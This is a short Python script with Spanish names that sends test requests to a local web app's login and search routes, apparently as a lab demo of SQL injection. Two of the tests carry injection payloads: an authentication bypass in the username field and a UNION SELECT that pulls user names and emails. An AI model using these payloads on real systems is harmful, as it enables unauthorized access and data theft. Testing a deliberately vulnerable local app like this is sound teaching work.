import os
os.environ.pop("SSLKEYLOGFILE", None)
import json

from urllib.parse import urlencode
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

BASE = "http://127.0.0.1:5000"


def probar(titulo, ruta, datos=None):
    cuerpo = None
    cabeceras = {}

    if datos is not None:
        cuerpo = urlencode(datos).encode("utf-8")
        cabeceras["Content-Type"] = (
            "application/x-www-form-urlencoded"
        )

    peticion = Request(
        BASE + ruta,
        data=cuerpo,
        headers=cabeceras
    )

    print("\n" + "=" * 50)
    print(titulo)

    try:
        with urlopen(peticion, timeout=5) as respuesta:
            estado = respuesta.status
            texto = respuesta.read().decode("utf-8")

    except HTTPError as error:
        estado = error.code
        texto = error.read().decode("utf-8")

    except URLError as error:
        print("No se pudo conectar:", error.reason)
        return

    print("Estado HTTP:", estado)

    try:
        contenido = json.loads(texto)
        print(json.dumps(
            contenido,
            ensure_ascii=False,
            indent=2
        ))
    except json.JSONDecodeError:
        print(texto)


probar(
    "PRUEBA 1: Acceso válido",
    "/login",
    {
        "usuario": "admin",
        "clave": "Demo123"
    }
)

probar(
    "PRUEBA 2: Contraseña incorrecta",
    "/login",
    {
        "usuario": "admin",
        "clave": "incorrecta"
    }
)

probar(
    "PRUEBA 3: Bypass de autenticación",
    "/login",
    {
        "usuario": "admin' -- ",
        "clave": "incorrecta"
    }
)

probar(
    "PRUEBA 4: Búsqueda normal",
    "/buscar?" + urlencode({
        "nombre": "Teclado"
    })
)

probar(
    "PRUEBA 5: Extracción de registros ficticios",
    "/buscar?" + urlencode({
        "nombre": "' UNION SELECT usuario, correo FROM usuarios -- "
    })
)